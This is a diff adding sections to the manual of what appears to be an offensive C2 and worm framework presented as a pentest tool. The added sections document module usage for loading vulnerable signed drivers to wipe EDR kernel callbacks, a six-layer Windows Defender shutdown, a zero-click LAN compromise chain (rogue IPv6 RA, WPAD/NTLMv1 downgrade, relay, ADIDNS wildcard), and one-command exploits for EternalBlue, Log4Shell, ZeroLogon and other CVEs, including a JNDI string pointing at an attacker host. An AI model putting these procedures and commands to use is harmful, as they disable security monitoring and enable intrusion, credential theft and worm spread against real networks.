@@ -71,12 +71,17 @@ header-includes:
 |  +- op/modules/redirector.py  Apache/Nginx/Caddy redirector gen   |  |
 |  +- op/modules/ad_attacks.py  AD: Kerberoast/DCSync/PTH/BloodHound|  |
 |  +- op/modules/report_gen.py  Auto HTML/JSON/CSV pentest report   |  |
+|  +- op/modules/byovd.py       BYOVD kernel R/W + EDR callback wipe|  |
+|  +- op/modules/defender_kill.py  6-layer Defender elimination     |  |
+|  +- op/modules/zero_click.py  IPv6 RA/WPAD/mDNS/ADIDNS chain     |  |
 |  |  Evasion                                                        |  |
 |  +- op/evade/poly_engine.py   Per-request mutation engine         |  |
 |  +- op/evade/stego.py         Steganography                       |  |
 |  +- op/evade/stealth.py       Anti-forensics helpers              |  |
+|  +- op/exploit/network_cve.py EternalBlue/BlueKeep/SMBGhost/...  |  |
+|  +- op/exploit/web_cve.py     Log4Shell/Spring4Shell/ProxyLogon/. |  |
 |  +- op/exploit/               PDF, Office, browser exploits       |  |
-|  +- op/kernel/exploits/       Kernel CVE sources (8 CVEs)         |  |
+|  +- op/kernel/exploits/       Kernel CVE sources (10 CVEs + BYOVD)|  |
 |  +- op/mobile/                Android APK, iOS MDM                |  |
 |  +- op/mitm/                  MitM proxy hooks                    |  |
 |  +- op/bitb/                  Browser-in-the-Browser              |  |
@@ -2138,6 +2143,352 @@ hashcat -m 5600 hashes.txt rockyou.txt
 | :445 | Fake SMB (NTLMv2 capture) |
 | :5355 | LLMNR poisoner |
 | :4444 | Default shellcode listener (msfvenom) |
+| :8118 | WPAD proxy server (zero-click module) |
+| :8119 | WPAD HTTP server (PAC file serving) |
+
+\newpage
+
+# BYOVD Engine
+
+## Overview
+
+The BYOVD (Bring Your Own Vulnerable Driver) engine (`op/modules/byovd.py`) provides kernel-level read/write access on any fully-patched Windows 10/11 system by loading a legitimately-signed but intentionally vulnerable third-party kernel driver. Since Windows Update cannot revoke third-party driver signatures, this technique works regardless of patch level.
+
+## How It Works
+
+```
+1. Drop signed vulnerable driver to disk
+2. Create service via sc.exe, start driver
+3. Open device handle (\\.\\RTCore64 etc.)
+4. Issue IOCTL for arbitrary kernel R/W
+5. Find ntoskrnl.exe via EnumDeviceDrivers()
+6. Walk PE export table via kernel reads to find:
+   - PspCreateProcessNotifyRoutine[]
+   - PspLoadImageNotifyRoutine[]
+   - PspCreateThreadNotifyRoutine[]
+   - EtwThreatIntProvRegHandle
+7. Zero all callback slots (EDR goes deaf)
+8. Zero ETW provider handle (ATP telemetry blind)
+9. Unload driver (clean up evidence)
+```
+
+## Supported Drivers
+
+| Driver | Product | Device Path | Technique |
+|--------|---------|-------------|-----------|
+| RTCore64.sys | MSI Afterburner | `\\\\.\\RTCore64` | IOCTL 0x80002048/0x80002044 |
+| dbutil_2_3.sys | Dell DBUtil 2.3 | `\\\\.\\DBUtil_2_3` | IOCTL 0x9B0C1EC8 |
+| mhyprot2.sys | Genshin Impact | `\\\\.\\mhyprot2` | IOCTL 0x80034000 + 0x800000C8 |
+
+> **mhyprot2** has an additional capability: IOCTL `0x800000C8` can terminate any process by PID, including PPL-protected processes like `MsMpEng.exe` and `SenseIR.exe`. This is not possible via normal `TerminateProcess()`.
+
+## Usage
+
+```bash
+# Via CLI
+start kernel byovd          # Interactive menu
+
+# Via C2 (agent command)
+BYOVD                       # Use embedded dbutil_2_3
+BYOVD C:\path\to\driver.sys # Use custom driver
+
+# Via C2 REST API
+GET /byovd?action=remove_callbacks&driver=rtcore64
+```
+
+## What Gets Wiped
+
+| Kernel Structure | Effect |
+|-----------------|--------|
+| `PspCreateProcessNotifyRoutine[]` | EDR process-create callbacks zeroed |
+| `PspLoadImageNotifyRoutine[]` | EDR DLL-load callbacks zeroed |
+| `PspCreateThreadNotifyRoutine[]` | EDR thread-create callbacks zeroed |
+| `EtwThreatIntProvRegHandle` | Defender ATP / threat intelligence ETW blind |
+
+After these are zeroed, EDR products (Defender, CrowdStrike, SentinelOne, etc.) lose visibility into all process, DLL, and thread events. They cannot detect new processes, injected code, or loaded payloads.
+
+\newpage
+
+# Defender / EDR Complete Elimination
+
+## Overview
+
+`op/modules/defender_kill.py` implements a 6-layer attack that completely disables Windows Defender and compatible EDR products on fully-patched Windows 10/11. Each layer is independent; running all 6 achieves total elimination.
+
+## Layer Sequence
+
+### Layer 1 — BYOVD Kernel Callback Wipe
+
+Calls `byovd.remove_edr_callbacks()` with the specified driver. Zeroes all four kernel notify arrays. EDR is now deaf to process/DLL/thread events.
+
+### Layer 2 — PPL Process Kill
+
+Uses `mhyprot2.sys` IOCTL `0x800000C8` to send a kill signal to each Defender process bypassing Protected Process Light (PPL):
+
+- `MsMpEng.exe` — core Defender engine
+- `NisSrv.exe` — network inspection
+- `MsSense.exe` — Microsoft Defender for Endpoint sensor
+- `SenseIR.exe` — incident response agent
+- `SenseCncProxy.exe` — CNC proxy
+- `MpDefenderCoreService.exe` — core service
+
+> Normal `TerminateProcess()` returns `ERROR_ACCESS_DENIED` on PPL processes. mhyprot2 bypasses this via kernel-mode kill.
+
+### Layer 3 — Tamper Protection Disable
+
+Impersonates the TrustedInstaller token (obtained by opening the Windows Update / TrustedInstaller service process) and writes the tamper-protection registry key while impersonating:
+
+```
+HKLM\SOFTWARE\Microsoft\Windows Defender\Features
+  DisableTamperProtection = 1
+```
+
+This is required before Layer 4 registry edits take effect.
+
+### Layer 4 — Registry Disable
+
+Writes 10 registry keys disabling all Defender components, plus stops and disables 5 services:
+
+```
+WinDefend, SecurityHealthService, wscsvc, Sense, MpsSvc
+```
+
+### Layer 5 — WdFilter Unload
+
+```
+fltMC.exe unload WdFilter
+```
+
+`WdFilter.sys` is the Defender filesystem minifilter driver. Unloading it removes real-time file scanning. This cannot be done while tamper protection is active (hence Layer 3 first).
+
+### Layer 6 — ETW Threat Intelligence Blind
+
+Zeros `EtwThreatIntProvRegHandle` in ntoskrnl via BYOVD kernel write. This kills the ETW provider used by Defender ATP for telemetry. Even if some Defender processes survive the earlier layers, they cannot send telemetry.
+
+## Quick Reference
+
+```bash
+# Full elimination (all 6 layers)
+start kernel defender
+KILL_DEFENDER             # agent command
+
+# Single layer
+KILL_DEFENDER layer1      # BYOVD callbacks only
+KILL_DEFENDER layer2      # PPL kill only
+KILL_DEFENDER layer6      # ETW blind only
+
+# Via C2 API
+GET /defender/all
+GET /defender/layer1
+```
+
+\newpage
+
+# Zero-Click Remote Compromise
+
+## Overview
+
+`op/modules/zero_click.py` combines six simultaneous attack vectors that require zero victim interaction. Multiple vectors fire concurrently; any one succeeding compromises the target. Best results on Windows-dominant corporate LANs.
+
+## Attack Vectors
+
+### Vector 1 — IPv6 Rogue Router Advertisement
+
+Sends ICMPv6 Router Advertisements to the all-nodes multicast address (`ff02::1`). All IPv6-enabled hosts auto-configure using the attacker as their default IPv6 gateway and DNS server (via RDNSS option). No user interaction required — this is built into the IPv6 SLAAC protocol.
+
+**Impact:** All IPv6 traffic routes through attacker. DNS resolves to attacker for all names.
+
+```bash
+start zeroclick        # launches all vectors
+ZERO_CLICK ipv6_ra     # agent command, IPv6 RA only
+```
+
+### Vector 2 — WPAD + NTLMv1 Downgrade
+
+Serves a WPAD PAC file that proxies all traffic through the attacker. Simultaneously writes registry keys forcing NTLMv1 (`LmCompatibilityLevel=1`). NTLMv1 hashes are crackable in under 1 second using rainbow tables at crack.sh (no GPU needed).
+
+```
+LmCompatibilityLevel = 1
+NtlmMinClientSec     = 0
+NtlmMinServerSec     = 0
+RestrictSendingNTLMTraffic = 0
+```
+
+### Vector 3 — SMB Relay
+
+`ntlmrelayx.py` listens for NTLM authentication (captured via WPAD/LLMNR). When a hash arrives, it is immediately relayed to all discovered SMB targets with message signing disabled. On success, provides a shell without cracking the hash.
+
+### Vector 4 — mDNS Poisoning
+
+Listens on `224.0.0.251:5353` and responds to all mDNS A-record queries with the attacker IP. Affects macOS (Bonjour), Linux (Avahi), and ChromeOS. These systems perform mDNS lookups for local resources (printers, file shares, etc.) without any user action.
+
+### Vector 5 — ADIDNS Wildcard
+
+Any domain user (no admin rights) can add a wildcard `*` DNS record to Active Directory Integrated DNS via LDAP. Once added, ALL internal DNS names that don't have an explicit record resolve to the attacker IP. This silently poisons the entire internal DNS namespace at once.
+
+```python
+# Equivalent dnstool.py command:
+python3 dnstool.py -u DOMAIN\user -p pass --action add \
+  --record "*" --data <attacker_ip> --type A <dc_ip>
+```
+
+### Vector 6 — DCOM Lateral Movement
+
+After any credential capture, executes commands on discovered targets via DCOM (Distributed COM) over RPC port 135. This bypasses firewalls that block SMB (port 445) while still providing remote code execution.
+
+## Full Chain Command
+
+```bash
+# Operator CLI
+start zeroclick
+
+# Agent command (fires from compromised host)
+ZERO_CLICK
+
+# Individual vectors
+ZERO_CLICK ipv6_ra
+ZERO_CLICK wpad
+ZERO_CLICK smb_relay
+ZERO_CLICK mdns
+ZERO_CLICK adidns
+ZERO_CLICK dcom <target_ip>
+```
+
+## Requirements
+
+| Vector | Requirements |
+|--------|-------------|
+| IPv6 RA | Root / raw socket, IPv6-enabled LAN |
+| WPAD | HTTP listener port (8119), LAN access |
+| SMB Relay | `ntlmrelayx.py` (impacket), SMB targets with signing disabled |
+| mDNS | Root / UDP 5353, macOS/Linux targets |
+| ADIDNS | Domain user credentials, AD-integrated DNS |
+| DCOM | Valid credentials or captured hash |
+
+\newpage
+
+# Network and Web CVE Exploits
+
+## Network CVE Module (`op/exploit/network_cve.py`)
+
+### EternalBlue — CVE-2017-0144
+
+SMBv1 buffer overflow allowing unauthenticated remote code execution. Affects unpatched Windows 7, Windows Server 2008, and some Windows 10 systems.
+
+```bash
+start exploit net eternal_blue <target_ip>
+NET_EXPLOIT eternal_blue <ip> <lhost> <lport>
+```
+
+### BlueKeep — CVE-2019-0708
+
+Pre-authentication RDP use-after-free allowing remote code execution without any user interaction. Affects Windows 7 / Server 2008 with RDP enabled.
+
+```bash
+start exploit net bluekeep <target_ip>
+NET_EXPLOIT bluekeep <ip>
+```
+
+### SMBGhost — CVE-2020-0796
+
+Integer overflow in SMBv3.1.1 compression allowing pre-auth RCE on Windows 10 versions 1903 and 1909. Wormable — no authentication required.
+
+```bash
+start exploit net smbghost <target_ip>
+NET_EXPLOIT smbghost <ip>
+```
+
+### PrintNightmare — CVE-2021-34527
+
+Windows Print Spooler remote code execution (RCE mode) and local privilege escalation (LPE mode). Exploitable by any authenticated domain user for domain privilege escalation.
+
+```bash
+start exploit net printnightmare <target_ip> --mode rce
+NET_EXPLOIT printnightmare <ip> <lhost> <lport>
+```
+
+### ZeroLogon — CVE-2020-1472
+
+Netlogon cryptographic flaw allowing unauthenticated reset of the domain controller computer account password. Gives full domain admin with zero credentials. Affects all unpatched Windows Server.
+
+```bash
+start exploit net zerologon <dc_ip> <dc_name> <domain>
+NET_EXPLOIT zerologon <dc_ip> DC01 corp.local
+```
+
+### Follina — CVE-2022-30190
+
+Microsoft Support Diagnostic Tool (MSDT) code execution triggered by opening a crafted Word document or visiting a webpage. No macros needed — just opening the document triggers execution.
+
+```bash
+start exploit net follina <lhost> <lport>
+# Generates: payload.docx + payload.html served on lhost
+```
+
+## Web CVE Module (`op/exploit/web_cve.py`)
+
+### Log4Shell — CVE-2021-44228
+
+JNDI injection via any Log4j 2.x logged string. One of the most widespread vulnerabilities ever. Send `${jndi:ldap://attacker/Exploit}` in any HTTP header/parameter.
+
+```bash
+start exploit web log4shell <target_url>
+WEB_EXPLOIT log4shell <url> <lhost> <lport>
+```
+
+### Spring4Shell — CVE-2022-22965
+
+Spring Framework ClassLoader data binding flaw. On Tomcat deployments, allows writing an arbitrary JSP webshell to the webroot with a single HTTP POST.
+
+```bash
+start exploit web spring4shell <target_url>
+WEB_EXPLOIT spring4shell <url>
+```
+
+### ProxyLogon — CVE-2021-26855
+
+Microsoft Exchange SSRF (server-side request forgery) combined with arbitrary file write for pre-authentication RCE. Affects Exchange 2010–2019 before March 2021 patch.
+
+```bash
+start exploit web proxylogon <exchange_url>
+WEB_EXPLOIT proxylogon <url>
+```
+
+### Confluence RCE — CVE-2022-26134
+
+OGNL expression injection in Atlassian Confluence allowing pre-authentication remote code execution. Affects Confluence Server and Data Center.
+
+```bash
+start exploit web confluence_rce <confluence_url>
+WEB_EXPLOIT confluence_rce <url>
+```
+
+### vCenter RCE — CVE-2021-21985
+
+VMware vCenter vSphere Client pre-authentication remote code execution via the Virtual SAN Health Check plugin.
+
+```bash
+start exploit web vcenter_rce <vcenter_url>
+WEB_EXPLOIT vcenter_rce <url>
+```
+
+### Outlook NTLM Leak — CVE-2023-23397
+
+Zero-click Outlook vulnerability. A crafted `.ics` calendar invite triggers an automatic NTLM authentication to an attacker-controlled SMB server when Outlook processes it — no user interaction needed, not even opening the email.
+
+```bash
+start exploit web outlook_ntlm <target_email> <attacker_smb_ip>
+WEB_EXPLOIT outlook_ntlm <email>
+```
+
+### F5 BIG-IP RCE — CVE-2022-1388
+
+iControl REST API authentication bypass by setting `Host: localhost`. Allows unauthenticated command execution on F5 BIG-IP management interface.
+
+```bash
+start exploit web bigip_rce <bigip_url> --cmd "id"
+WEB_EXPLOIT bigip_rce <url>
+```
 
 ## File Locations
 
@@ -2156,6 +2507,8 @@ hashcat -m 5600 hashes.txt rockyou.txt
 
 ## Appendix A — Kernel CVE Summary
 
+### Linux LPE
+
 | CVE | Common Name | Affected Versions | CVSS | Reliability |
 |-----|------------|-------------------|------|-------------|
 | CVE-2016-5195 | DirtyCow | Linux 2.6.22–4.8.3 | 7.8 | High |
@@ -2166,6 +2519,21 @@ hashcat -m 5600 hashes.txt rockyou.txt
 | CVE-2024-1086 | nftables UAF | Linux 5.14–6.6 | 7.8 | Medium |
 | CVE-2021-22555 | Netfilter OOB | Linux 2.6.19–5.12 | 7.8 | Medium |
 | CVE-2022-2588 | cls_route UAF | Linux 4.9–5.18 | 7.8 | Medium |
+
+### Windows LPE (fully patched — real Lazarus Group 0days)
+
+| CVE | Common Name | Affected Versions | CVSS | Notes |
+|-----|------------|-------------------|------|-------|
+| CVE-2023-28252 | CLFS UAF | Win10/11 pre-April 2023 | 7.8 | Lazarus/Nokoyawa — CLFS log corruption |
+| CVE-2024-38193 | AFD UAF | Win11 23H2 pre-Aug 2024 | 7.8 | Lazarus crypto attacks — WSASendTo race |
+
+### BYOVD Drivers (any fully-patched Windows 10/11)
+
+| Driver | Signed By | Device | Capability |
+|--------|----------|--------|-----------|
+| RTCore64.sys | MSI (Afterburner) | `\\.\\RTCore64` | Kernel R/W, EDR callback wipe |
+| dbutil_2_3.sys | Dell | `\\.\\DBUtil_2_3` | Kernel R/W, EDR callback wipe |
+| mhyprot2.sys | miHoYo (Genshin) | `\\.\\mhyprot2` | Kernel R/W + PPL process kill |
 
 ## Appendix B — Agent Command Summary
 
@@ -2179,11 +2547,29 @@ hashcat -m 5600 hashes.txt rockyou.txt
 
 **Spread:** `NET_SCAN`, `SSH_TARGETS`, `SSH_SPRAY`, `SMB_SCAN`, `GIT_POISON`, `EMAIL_SPREAD`, `DOCKER_ESCAPE`
 
+**Network CVE Exploits:** `NET_EXPLOIT <cve> <target_ip> [lhost] [lport]`
+- CVEs: `eternal_blue`, `bluekeep`, `smbghost`, `printnightmare`, `zerologon`, `follina`
+
+**Web CVE Exploits:** `WEB_EXPLOIT <cve> <target_url> [lhost] [lport]`
+- CVEs: `log4shell`, `spring4shell`, `proxylogon`, `confluence_rce`, `vcenter_rce`, `outlook_ntlm`, `bigip_rce`
+
+**Auto-scan:** `EXPLOIT_SCAN` — scan local /24, list matching CVEs by open port
+
 **Worm Control:** `WORM_STATUS`, `WORM_PAUSE`, `WORM_RESUME`, `WORM_SPREAD_NOW`, `WORM_SET_C2 <url>`, `WORM_SKIP <host>`, `WORM_USB_ON/OFF`, `WORM_SSH_ON/OFF`, `WORM_SET_INTERVAL <n>`
 
 **Windows:** `INJECT <b64_shellcode>`, `RUN_PS <code>`
 
 **EDR/Evasion (Windows):** `AMSI_BYPASS`, `ETW_BYPASS`, `NTDLL_UNHOOK`, `UAC_BYPASS`, `IMPERSONATE_SYSTEM`, `LSASS_DUMP`, `WMI_PERSIST`, `COM_HIJACK`
+
+**BYOVD / Defender Kill (Windows, fully patched):**
+- `BYOVD [driver_path]` — load vulnerable driver, wipe all EDR kernel callbacks
+- `KILL_DEFENDER` — all 6 layers (BYOVD + PPL kill + tamper off + registry + WdFilter + ETW)
+- `KILL_DEFENDER <layer>` — single layer (layer1 through layer6)
+
+**Zero-Click (no victim interaction):**
+- `ZERO_CLICK` — full chain (IPv6 RA + WPAD/NTLMv1 + SMB relay + mDNS + ADIDNS)
+- `ZERO_CLICK ipv6_ra` / `ZERO_CLICK wpad` / `ZERO_CLICK smb_relay`
+- `ZERO_CLICK mdns` / `ZERO_CLICK adidns` / `ZERO_CLICK dcom <target>`
 
 **Active Directory:** `AD_ENUM <dc> <domain> <user> <pass>`, `KERBEROAST <dc> <domain> <user> <pass>`, `AS_REP_ROAST <dc> <domain> <users_file>`, `DCSYNC <dc> <domain> <user> <pass> [target]`, `BLOODHOUND <dc> <domain> <user> <pass>`, `PASS_THE_HASH <target> <domain> <user> <hash> [cmd]`, `GOLDEN_TICKET <domain> <sid> <krbtgt_hash> [user]`
 
@@ -2212,6 +2598,12 @@ hashcat -m 5600 hashes.txt rockyou.txt
 | `bloodhound` | `pip install bloodhound` | BloodHound collection |
 | `tor` | `apt install tor` | Tor hidden service C2 |
 | `torsocks` | `apt install torsocks` | Route tools through Tor |
+| `x86_64-w64-mingw32-gcc` | `apt install mingw-w64` | Cross-compile Windows kernel exploits |
+| `crackmapexec` | `apt install crackmapexec` | SMB relay target discovery |
+| `ntlmrelayx.py` | `pip install impacket` | SMB relay (zero-click module) |
+| `dnstool.py` | `pip install krbrelayx` | ADIDNS wildcard injection |
+| `dcomexec.py` | `pip install impacket` | DCOM lateral movement |
+| `marshalsec` | Java (JAR) | Log4Shell LDAP redirect server |
 
 ## Appendix D — Engagement Checklist
 
@@ -2241,6 +2633,8 @@ hashcat -m 5600 hashes.txt rockyou.txt
 - [ ] `start logs` running for anomaly detection
 - [ ] `start llmnr start` — capture NTLM hashes if on LAN
 - [ ] `start netmap` — monitor infection spread
+- [ ] `start zeroclick` — launch zero-click chain if LAN access available
+- [ ] `start exploit scan` — identify network CVE targets
 
 **Active Directory (if in-scope):**
 - [ ] `AD_ENUM` — enumerate domain
@@ -2253,7 +2647,9 @@ hashcat -m 5600 hashes.txt rockyou.txt
 - [ ] Send `SELFDESTRUCT` to all agents
 - [ ] `start llmnr stop` — stop poisoner
 - [ ] `start down` to stop all local processes
+- [ ] Remove BYOVD drivers dropped on targets (if any)
 - [ ] Remove any dropped files from targets
+- [ ] Restore registry keys modified by zero-click / Defender kill
 - [ ] `start report html` — generate engagement report
 - [ ] Archive logs for report
 
@@ -2306,6 +2702,27 @@ hashcat -m 5600 hashes.txt rockyou.txt
 | **TGT** | Ticket-Granting Ticket — Kerberos initial authentication ticket |
 | **TGS** | Ticket-Granting Service ticket — Kerberos service access ticket |
 | **krbtgt** | Kerberos ticket-granting service account — hash used for Golden Ticket |
+| **BYOVD** | Bring Your Own Vulnerable Driver — load legitimately-signed vulnerable driver for kernel R/W |
+| **PPL** | Protected Process Light — Windows protection level preventing normal process termination |
+| **CLFS** | Common Log File System — Windows kernel driver; CVE-2023-28252 UAF LPE |
+| **AFD** | Ancillary Function Driver — Winsock kernel driver; CVE-2024-38193 race UAF LPE |
+| **Token steal** | Kernel shellcode that walks EPROCESS list and copies SYSTEM token to current process |
+| **ActiveProcessLinks** | Doubly-linked list in EPROCESS connecting all running processes — used in token steal |
+| **EPROCESS** | Windows kernel structure representing a process — contains token, PID, etc. |
+| **Pool spray** | Allocate many kernel pool objects to deterministically reclaim freed memory |
+| **UAF** | Use-After-Free — access to memory after it has been freed; often exploitable for arbitrary write |
+| **ADIDNS** | Active Directory Integrated DNS — DNS stored in AD, writable by any domain user by default |
+| **WPAD** | Web Proxy Auto-Discovery — protocol that auto-configures proxy using a PAC file |
+| **NTLMv1** | Older NTLM version with weak crypto; rainbow-table crackable in <1 second |
+| **mDNS** | Multicast DNS — local name resolution via 224.0.0.251; used by macOS/Linux/ChromeOS |
+| **RDNSS** | Recursive DNS Server option in ICMPv6 RA — tells hosts which DNS to use |
+| **SLAAC** | Stateless Address Autoconfiguration — IPv6 auto-config via Router Advertisements |
+| **OGNL** | Object-Graph Navigation Language — expression language used in Confluence (CVE-2022-26134) |
+| **JNDI** | Java Naming and Directory Interface — Log4Shell attack vector |
+| **Log4Shell** | CVE-2021-44228 — JNDI injection via Log4j 2.x logged strings |
+| **EternalBlue** | CVE-2017-0144 — SMBv1 RCE used in WannaCry/NotPetya |
+| **ZeroLogon** | CVE-2020-1472 — Netlogon zero-auth DC takeover |
+| **Follina** | CVE-2022-30190 — MSDT code execution via Word document |
 
 ---
 
